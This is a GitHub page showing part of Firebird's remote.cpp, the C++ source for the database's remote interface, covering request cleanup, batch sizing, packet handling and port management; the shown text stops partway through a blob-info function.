  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFirebirdSQL%2Ffirebird%2Fblob%2Fmaster%2Fsrc%2Fremote%2Fremote.cpp)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=FirebirdSQL%2Ffirebird)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[FirebirdSQL](/FirebirdSQL)
/
**[firebird](/FirebirdSQL/firebird)**
Public

* [Notifications](/login?return_to=%2FFirebirdSQL%2Ffirebird) You must be signed in to change notification settings
* [Fork
  220](/login?return_to=%2FFirebirdSQL%2Ffirebird)
* [Star
   1.3k](/login?return_to=%2FFirebirdSQL%2Ffirebird)

* [Code](/FirebirdSQL/firebird)
* [Issues
  1.7k](/FirebirdSQL/firebird/issues)
* [Pull requests
  64](/FirebirdSQL/firebird/pulls)
* [Discussions](/FirebirdSQL/firebird/discussions)
* [Actions](/FirebirdSQL/firebird/actions)
* [Projects
  0](/FirebirdSQL/firebird/projects)
* [Security](/FirebirdSQL/firebird/security)
* [Insights](/FirebirdSQL/firebird/pulse)

Additional navigation options

* [Code](/FirebirdSQL/firebird)
* [Issues](/FirebirdSQL/firebird/issues)
* [Pull requests](/FirebirdSQL/firebird/pulls)
* [Discussions](/FirebirdSQL/firebird/discussions)
* [Actions](/FirebirdSQL/firebird/actions)
* [Projects](/FirebirdSQL/firebird/projects)
* [Security](/FirebirdSQL/firebird/security)
* [Insights](/FirebirdSQL/firebird/pulse)

## Files

 master
## Breadcrumbs

1. [firebird](/FirebirdSQL/firebird/tree/master)
2. /[src](/FirebirdSQL/firebird/tree/master/src)
3. /[remote](/FirebirdSQL/firebird/tree/master/src/remote)
/
# remote.cpp

Copy path Blame  Blame
## Latest commit

## History

[History](/FirebirdSQL/firebird/commits/master/src/remote/remote.cpp)1765 lines (1508 loc) · 40.6 KB master
## Breadcrumbs

1. [firebird](/FirebirdSQL/firebird/tree/master)
2. /[src](/FirebirdSQL/firebird/tree/master/src)
3. /[remote](/FirebirdSQL/firebird/tree/master/src/remote)
/
# remote.cpp

Top
## File metadata and controls

* Code
* Blame

1765 lines (1508 loc) · 40.6 KB[Raw](https://github.com/FirebirdSQL/firebird/raw/refs/heads/master/src/remote/remote.cpp)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000/\* \* PROGRAM: JRD Remote Interface \* MODULE: remote.cpp \* DESCRIPTION: Common routines for remote interface/server \* \* The contents of this file are subject to the Interbase Public \* License Version 1.0 (the "License"); you may not use this file \* except in compliance with the License. You may obtain a copy \* of the License at http://www.Inprise.com/IPL.html \* \* Software distributed under the License is distributed on an \* "AS IS" basis, WITHOUT WARRANTY OF ANY KIND, either express \* or implied. See the License for the specific language governing \* rights and limitations under the License. \* \* The Original Code was created by Inprise Corporation \* and its predecessors. Portions created by Inprise Corporation are \* Copyright (C) Inprise Corporation. \* \* All Rights Reserved. \* Contributor(s): \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_. \*/
#include "firebird.h"#include <string.h>#include <stdlib.h>#include "ibase.h"#include "../remote/remote.h"#include "../common/file\_params.h"#include "../common/gdsassert.h"#include "../remote/proto\_proto.h"#include "../remote/remot\_proto.h"#include "../yvalve/gds\_proto.h"#include "../common/config/config.h"#include "../common/classes/init.h"#include "../common/db\_alias.h"#include "firebird/Interface.h"#include "../common/os/mod\_loader.h"#include "../jrd/license.h"#include "../common/classes/ImplementHelper.h"#include "../common/utils\_proto.h"
using namespace Firebird;
#ifdef DEV\_BUILDAtomicCounter rem\_port::portCounter;#endif
#ifdef REMOTE\_DEBUGIMPLEMENT\_TRACE\_ROUTINE(remote\_trace, "REMOTE")#endif
const ParametersSet dpbParam ={ isc\_dpb\_dummy\_packet\_interval, isc\_dpb\_user\_name, isc\_dpb\_auth\_block, isc\_dpb\_password, isc\_dpb\_password\_enc, isc\_dpb\_trusted\_auth, isc\_dpb\_auth\_plugin\_name, isc\_dpb\_auth\_plugin\_list, isc\_dpb\_specific\_auth\_data, isc\_dpb\_address\_path, isc\_dpb\_process\_id, isc\_dpb\_process\_name, isc\_dpb\_encrypt\_key, isc\_dpb\_client\_version, isc\_dpb\_remote\_protocol, isc\_dpb\_host\_name, isc\_dpb\_os\_user, isc\_dpb\_config, isc\_dpb\_utf8\_filename, isc\_dpb\_map\_attach};
const ParametersSet spbParam ={ isc\_spb\_dummy\_packet\_interval, isc\_spb\_user\_name, isc\_spb\_auth\_block, isc\_spb\_password, isc\_spb\_password\_enc, isc\_spb\_trusted\_auth, isc\_spb\_auth\_plugin\_name, isc\_spb\_auth\_plugin\_list, isc\_spb\_specific\_auth\_data, isc\_spb\_address\_path, isc\_spb\_process\_id, isc\_spb\_process\_name, 0, isc\_spb\_client\_version, isc\_spb\_remote\_protocol, isc\_spb\_host\_name, isc\_spb\_os\_user, isc\_spb\_config, isc\_spb\_utf8\_filename, 0};
const ParametersSet connectParam ={ 0, CNCT\_login, 0, 0, 0, 0, CNCT\_plugin\_name, CNCT\_plugin\_list, CNCT\_specific\_data, 0, 0, 0, 0, 0, 0, CNCT\_host, CNCT\_user, 0, 0, 0};
const SLONG DUMMY\_INTERVAL = 60; // secondsconst int ATTACH\_FAILURE\_SPACE = 16 \* 1024; // bytes
void REMOTE\_cleanup\_transaction( Rtr\* transaction){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ c l e a n u p \_ t r a n s a c t i o n \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* A transaction is being committed or rolled back. \* Purge any active messages in case the user calls \* receive while we still have something cached. \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ for (Rrq\* request = transaction->rtr\_rdb->rdb\_requests; request; request = request->rrq\_next) { if (request->rrq\_rtr == transaction) { REMOTE\_reset\_request(request, 0); request->rrq\_rtr = NULL; } for (Rrq\* level = request->rrq\_levels; level; level = level->rrq\_next) { if (level->rrq\_rtr == transaction) { REMOTE\_reset\_request(level, 0); level->rrq\_rtr = NULL; } } }
 for (Rsr\* statement = transaction->rtr\_rdb->rdb\_sql\_requests; statement; statement = statement->rsr\_next) { if (statement->rsr\_rtr == transaction) { REMOTE\_reset\_statement(statement); statement->rsr\_flags.clear(Rsr::FETCHED); statement->rsr\_rtr = NULL; } }}
USHORT REMOTE\_compute\_batch\_size(rem\_port\* port, USHORT buffer\_used, P\_OP op\_code, const rem\_fmt\* format){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ c o m p u t e \_ b a t c h \_ s i z e \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* \* When batches of records are returned, they are returned as \* follows: \* <op\_fetch\_response> <data\_record 1> \* <op\_fetch\_response> <data\_record 2> \* ... \* <op\_fetch\_response> <data\_record n-1> \* <op\_fetch\_response> <data\_record n> \* \* end-of-batch is indicated by setting p\_sqldata\_messages to \* 0 in the op\_fetch\_response. End of cursor is indicated \* by setting p\_sqldata\_status to a non-zero value. Note \* that a fetch CAN be attempted after end of cursor, this \* is sent to the server for the server to return the appropriate \* error code. \* \* Each data block has one overhead packet \* to indicate the data is present. \* \* (See also op\_send in receive\_msg() - which is a kissing cousin \* to this routine) \* \* Here we make a guess for the optimal number of records to \* send in each batch. This is important as we wait for the \* whole batch to be received before we return the first item \* to the client program. How many are cached on the client also \* impacts client-side memory utilization. \* \* We optimize the number by how many can fit into a packet. \* The client calculates this number (n from the list above) \* and sends it to the server. \* \* The data size is either the XDR data representation, or the \* actual message size (rounded up) if this is a symmetric \* architecture connection. \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/
 const USHORT op\_overhead = (USHORT) xdr\_protocol\_overhead(op\_code);
#ifdef DEBUG fprintf(stderr, "port\_buff\_size = %d fmt\_net\_length = %d fmt\_length = %d overhead = %d\n", port->port\_buff\_size, format->fmt\_net\_length, format->fmt\_length, op\_overhead);#endif
 const ULONG row\_size = op\_overhead + (port->port\_flags & PORT\_symmetric) ? ROUNDUP(format->fmt\_length, 4) : // Same architecture connection ROUNDUP(format->fmt\_net\_length, 4); // Using XDR for data transfer
 ULONG result = (port->port\_protocol >= PROTOCOL\_VERSION13) ? MAX\_ROWS\_PER\_BATCH : (MAX\_PACKETS\_PER\_BATCH \* port->port\_buff\_size - buffer\_used) / row\_size;
 // Don't ask for more records than we can cache
 result = MIN(result, MAX\_BATCH\_CACHE\_SIZE / format->fmt\_length);
 // Must always send some messages, even if message is larger than packet
 result = MAX(result, MIN\_ROWS\_PER\_BATCH);
 fb\_assert(result <= MAX\_USHORT); return static\_cast<USHORT>(result);}
Rrq\* REMOTE\_find\_request(Rrq\* request, USHORT level){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ f i n d \_ r e q u e s t \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Find sub-request if level is non-zero. \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/
 // See if we already know about the request level
 for (;;) { if (request->rrq\_level == level) return request; if (!request->rrq\_levels) break; request = request->rrq\_levels; }
 // This is a new level -- make up a new request block.
 request->rrq\_levels = request->clone(); // FREE: REMOTE\_remove\_request()#ifdef DEBUG\_REMOTE\_MEMORY printf("REMOTE\_find\_request allocate request %x\n", request->rrq\_levels);#endif request = request->rrq\_levels; request->rrq\_level = level; request->rrq\_levels = NULL;
 // Allocate message block for known messages
 Rrq::rrq\_repeat\* tail = request->rrq\_rpt.begin(); const Rrq::rrq\_repeat\* const end = tail + request->rrq\_max\_msg; for (; tail <= end; tail++) { const rem\_fmt\* format = tail->rrq\_format; if (!format) continue; RMessage\* msg = FB\_NEW RMessage(format->fmt\_length); tail->rrq\_xdr = msg;#ifdef DEBUG\_REMOTE\_MEMORY printf("REMOTE\_find\_request allocate message %x\n", msg);#endif msg->msg\_next = msg; msg->msg\_number = tail->rrq\_message->msg\_number; tail->rrq\_message = msg; }
 return request;}
void REMOTE\_free\_packet( rem\_port\* port, PACKET \* packet, bool partial){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ f r e e \_ p a c k e t \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Zero out a full packet block (partial == false) or \* part of packet used in last operation (partial == true) \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ RemoteXdr xdr; USHORT n;
 if (packet) { xdr.create(reinterpret\_cast<char\*>(packet), sizeof(PACKET), XDR\_FREE); xdr.x\_public = port; xdr.x\_local = (port->port\_type == rem\_port::XNET);
 if (partial) { xdr\_protocol(&xdr, packet); } else { for (n = (USHORT) op\_connect; n < (USHORT) op\_max; n++) { packet->p\_operation = (P\_OP) n; xdr\_protocol(&xdr, packet); } }#ifdef DEBUG\_XDR\_MEMORY // All packet memory allocations should now be voided. // note: this code will may work properly if partial == true
 for (n = 0; n < P\_MALLOC\_SIZE; n++) fb\_assert(packet->p\_malloc[n].p\_operation == op\_void);#endif packet->p\_operation = op\_void; }}
void REMOTE\_get\_timeout\_params(rem\_port\* port, ClumpletReader\* pb){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ g e t \_ t i m e o u t \_ p a r a m s \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Determine the connection timeout parameter values for this newly created \* port. If the client did a specification in the DPB, use those values. \* Otherwise, see if there is anything in the configuration file. The \* configuration file management code will set the default values if there \* is no other specification. \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ //bool got\_dpb\_connect\_timeout = false;
 fb\_assert(isc\_dpb\_connect\_timeout == isc\_spb\_connect\_timeout);
 port->port\_connect\_timeout = pb && pb->find(isc\_dpb\_connect\_timeout) ? pb->getInt() : port->getPortConfig()->getConnectionTimeout();
 port->port\_flags |= PORT\_dummy\_pckt\_set; port->port\_dummy\_packet\_interval = port->getPortConfig()->getDummyPacketInterval(); if (port->port\_dummy\_packet\_interval < 0) port->port\_dummy\_packet\_interval = DUMMY\_INTERVAL;
 port->port\_dummy\_timeout = port->port\_dummy\_packet\_interval;
#ifdef DEBUG printf("REMOTE\_get\_timeout dummy = %lu conn = %lu\n", port->port\_dummy\_packet\_interval, port->port\_connect\_timeout); fflush(stdout);#endif}
rem\_str\* REMOTE\_make\_string(const SCHAR\* input){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ m a k e \_ s t r i n g \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Copy a given string to a permanent location, returning \* address of new string. \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ const USHORT length = static\_cast<USHORT>(strlen(input)); rem\_str\* string = FB\_NEW\_RPT(\*getDefaultMemoryPool(), length) rem\_str;#ifdef DEBUG\_REMOTE\_MEMORY printf("REMOTE\_make\_string allocate string %x\n", string);#endif strcpy(string->str\_data, input); string->str\_length = length;
 return string;}
void REMOTE\_release\_messages( RMessage\* messages){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ r e l e a s e \_ m e s s a g e s \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Release a circular list of messages. \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ RMessage\* message = messages; if (message) { while (true) { RMessage\* temp = message; message = message->msg\_next;#ifdef DEBUG\_REMOTE\_MEMORY printf("REMOTE\_release\_messages free message %x\n", temp);#endif delete temp; if (message == messages) break; } }}
void REMOTE\_release\_request( Rrq\* request){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ r e l e a s e \_ r e q u e s t \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Release a request block and friends. \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ Rdb\* rdb = request->rrq\_rdb;
 for (Rrq\*\* p = &rdb->rdb\_requests; \*p; p = &(\*p)->rrq\_next) { if (\*p == request) { \*p = request->rrq\_next; break; } }
 // Get rid of request and all levels
 for (;;) { Rrq::rrq\_repeat\* tail = request->rrq\_rpt.begin(); const Rrq::rrq\_repeat\* const end = tail + request->rrq\_max\_msg; for (; tail <= end; tail++) { RMessage\* message = tail->rrq\_message; if (message) { if (!request->rrq\_level) {#ifdef DEBUG\_REMOTE\_MEMORY printf("REMOTE\_release\_request free format %x\n", tail->rrq\_format);#endif delete tail->rrq\_format; } REMOTE\_release\_messages(message); } } Rrq\* next = request->rrq\_levels;#ifdef DEBUG\_REMOTE\_MEMORY printf("REMOTE\_release\_request free request %x\n", request);#endif delete request; if (!(request = next)) break; }}
void REMOTE\_reset\_request( Rrq\* request, RMessage\* active\_message){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ r e s e t \_ r e q u e s t \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Clean up a request in preparation to use it again. Since \* there may be an active message (start\_and\_send), exercise \* some care to avoid zapping that message. \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ Rrq::rrq\_repeat\* tail = request->rrq\_rpt.begin(); const Rrq::rrq\_repeat\* const end = tail + request->rrq\_max\_msg; for (; tail <= end; tail++) { RMessage\* message = tail->rrq\_message; if (message != NULL && message != active\_message) { tail->rrq\_xdr = message; tail->rrq\_rows\_pending = 0; tail->rrq\_reorder\_level = 0; tail->rrq\_batch\_count = 0; while (true) { message->msg\_address = NULL; message = message->msg\_next; if (message == tail->rrq\_message) break; } } }
 // Initialize the request status to FB\_SUCCESS
 //request->rrq\_status\_vector[1] = 0; request->rrqStatus.clear();}
void REMOTE\_reset\_statement( Rsr\* statement){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ r e s e t \_ s t a t e m e n t \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Reset a statement by releasing all buffers except 1 \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ RMessage\* message;
 if (!statement || (!(message = statement->rsr\_message))) return;
 // Reset all the pipeline counters
 statement->rsr\_rows\_pending = 0; statement->rsr\_msgs\_waiting = 0; statement->rsr\_reorder\_level = 0; statement->rsr\_batch\_count = 0;
 // only one entry
 if (message->msg\_next == message) return;
 // find the entry before statement->rsr\_message
 RMessage\* temp = message->msg\_next; while (temp->msg\_next != message) temp = temp->msg\_next;
 temp->msg\_next = message->msg\_next; message->msg\_next = message;
 statement->rsr\_buffer = statement->rsr\_message;
 REMOTE\_release\_messages(temp);}
// TMN: Beginning of C++ port - ugly but a start
void rem\_port::linkParent(rem\_port\* const parent){ fb\_assert(parent); fb\_assert(this->port\_parent == NULL);
 this->port\_parent = parent; this->port\_next = parent->port\_clients; this->port\_server = parent->port\_server; this->port\_server\_flags = parent->port\_server\_flags; this->port\_config = parent->port\_config;
 parent->port\_clients = parent->port\_next = this;}
const RefPtr<const Config>& rem\_port::getPortConfig() const{ return port\_config.hasData() ? port\_config : Config::getDefaultConfig();}
RefPtr<const Config> rem\_port::getPortConfig(){ return port\_config.hasData() ? port\_config : Config::getDefaultConfig();}
void rem\_port::unlinkParent(){ if (this->port\_parent == NULL) return;
#ifdef DEV\_BUILD bool found = false;#endif
 for (rem\_port\*\* ptr = &this->port\_parent->port\_clients; \*ptr; ptr = &(\*ptr)->port\_next) { if (\*ptr == this) { \*ptr = this->port\_next;
 if (ptr == &this->port\_parent->port\_clients) { fb\_assert(this->port\_parent->port\_next == this);
 this->port\_parent->port\_next = \*ptr; }
#ifdef DEV\_BUILD found = true;#endif break; } } // for
 fb\_assert(found);
 this->port\_parent = NULL;}
bool rem\_port::accept(p\_cnct\* cnct){ return (\*this->port\_accept)(this, cnct);}
void rem\_port::disconnect(){ (\*this->port\_disconnect)(this);}
void rem\_port::force\_close(){ (\*this->port\_force\_close)(this);}
rem\_port\* rem\_port::receive(PACKET\* pckt){ return (\*this->port\_receive\_packet)(this, pckt);}
bool rem\_port::select\_multi(UCHAR\* buffer, SSHORT bufsize, SSHORT\* length, RemPortPtr& port){ return (\*this->port\_select\_multi)(this, buffer, bufsize, length, port);}
void rem\_port::abort\_aux\_connection(){ if (this->port\_abort\_aux\_connection) { (\*this->port\_abort\_aux\_connection)(this); }}
XDR\_INT rem\_port::send(PACKET\* pckt){ return (\*this->port\_send\_packet)(this, pckt);}
XDR\_INT rem\_port::send\_partial(PACKET\* pckt){ return (\*this->port\_send\_partial)(this, pckt);}
rem\_port\* rem\_port::connect(PACKET\* pckt){ return (\*this->port\_connect)(this, pckt);}
rem\_port\* rem\_port::request(PACKET\* pckt){ return (\*this->port\_request)(this, pckt);}
void rem\_port::auxAcceptError(PACKET\* packet){ if (port\_protocol >= PROTOCOL\_VERSION13) { packet->p\_operation = op\_abort\_aux\_connection; // Ignore error return - we are already processing auxiliary connection error from the wire send(packet); }}
bool\_t REMOTE\_getbytes (RemoteXdr\* xdrs, SCHAR\* buff, unsigned bytecount){/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* R E M O T E \_ g e t b y t e s \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \* \* Functional description \* Get a bunch of bytes from a port buffer \* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/
 while (bytecount > 0) { if (xdrs->x\_handy >= bytecount) { memcpy(buff, xdrs->x\_private, bytecount); xdrs->x\_private += bytecount; xdrs->x\_handy -= bytecount; break; }
 if (xdrs->x\_handy > 0) { memcpy(buff, xdrs->x\_private, xdrs->x\_handy); xdrs->x\_private += xdrs->x\_handy; buff += xdrs->x\_handy; bytecount -= xdrs->x\_handy; xdrs->x\_handy = 0; }
 rem\_port\* port = xdrs->x\_public; RefMutexEnsureUnlock queGuard(\*port->port\_que\_sync, FB\_FUNCTION); queGuard.enter(); if (port->port\_qoffset >= port->port\_queue.getCount()) { queGuard.leave();
 port->port\_partial\_data = true; return FALSE; }
 xdrs->x\_handy = port->port\_queue[port->port\_qoffset].getCount(); fb\_assert(xdrs->x\_handy <= port->port\_buff\_size); memcpy(xdrs->x\_base, port->port\_queue[port->port\_qoffset].begin(), xdrs->x\_handy); ++port->port\_qoffset; xdrs->x\_private = xdrs->x\_base; }
 return TRUE;}
void PortsCleanup::registerPort(rem\_port\* port){ MutexLockGuard guard(m\_mutex, FB\_FUNCTION);
 if (closing) return;
 if (!m\_ports) { MemoryPool& pool = \*getDefaultMemoryPool(); m\_ports = FB\_NEW\_POOL (pool) PortsArray(pool); }
 m\_ports->add(port);}
void PortsCleanup::unRegisterPort(rem\_port\* port){ MutexLockGuard guard(m\_mutex, FB\_FUNCTION);
 if (closing) return;
 if (m\_ports) { FB\_SIZE\_T i; const bool found = m\_ports->find(port, i); //fb\_assert(found); if (found) m\_ports->remove(i); }}
void PortsCleanup::closePorts(){ if (m\_ports) delay();
 MutexLockGuard guard(m\_mutex, FB\_FUNCTION); AutoSetRestore cl(&closing, true);
 { // scope MutexUnlockGuard g2(m\_mutex, FB\_FUNCTION); Thread::yield(); }
 if (m\_ports) { rem\_port\* const\* ptr = m\_ports->begin(); const rem\_port\* const\* end = m\_ports->end(); for (; ptr < end; ptr++) { closePort(\*ptr); }
 delete m\_ports; m\_ports = NULL; }}
void PortsCleanup::closePort(rem\_port\* port){ port->force\_close();}
void PortsCleanup::delay(){}
ServerAuthBase::~ServerAuthBase(){}
ServerCallbackBase::~ServerCallbackBase(){}
/\*void Rdb::set\_async\_vector(ISC\_STATUS\* userStatus) noexcept{ rdb\_async\_status\_vector = userStatus; rdb\_async\_thread\_id = getThreadId();}
void Rdb::reset\_async\_vector() noexcept{ rdb\_async\_thread\_id = 0; rdb\_async\_status\_vector = NULL;}
ISC\_STATUS\* Rdb::get\_status\_vector() noexcept{ return rdb\_async\_thread\_id == getThreadId() ? rdb\_async\_status\_vector : rdb\_status\_vector;}\*/
bool RBlobInfo::getLocalInfo(unsigned int itemsLength, const unsigned char\* items, unsigned int bufferLength, unsigned char\* buffer){ if (!valid) return false;
 unsigned char\* p = buffer; const unsigned char\* const end = buffer + bufferLength;
 for (auto item = items; p && (item < items + itemsLength); item++) { if (\*item == isc\_info\_end) break;
 switch (\*item) { case isc\_info\_blob\_num\_segments: p = fb\_utils::putInfoItemInt(\*item, num\_segments, p, end); break;
